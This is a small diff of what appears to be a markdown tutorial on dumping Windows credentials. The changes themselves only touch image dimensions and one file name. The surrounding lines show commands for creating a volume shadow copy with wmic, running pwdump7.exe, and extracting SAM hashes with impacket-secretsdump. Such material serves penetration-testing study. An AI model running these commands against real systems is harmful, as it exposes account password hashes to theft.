@@ -38,13 +38,13 @@ Creating a shadow volume
 ```
  wmic shadowcopy call create Volume='C:\'
  ```
- <img src="/img/cred1/2.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/cred1/2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 To verify this
  ```
 - Listing shadow volumes
  ```
-  <img src="/img/cred1/3.png" alt="Getting-gz" width="800" height="200"> 
+  <img src="/img/cred1/3.png" alt="Getting-gz" width="800" height="100"> 
 
 
 
@@ -97,6 +97,7 @@ windows10
 ```
 pwdump7.exe
 ```
+
 <img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="800" height="200"> 
 
 ```
@@ -117,7 +118,7 @@ Impacket tool can also extract all the hashes for you from the SAM file
 ```
 impacket-secretsdump -system SYSTEM -sam SAM local
 ```
-<img src="/img/cred1/impacket.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/impacker.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
 ## Decrypting Hash
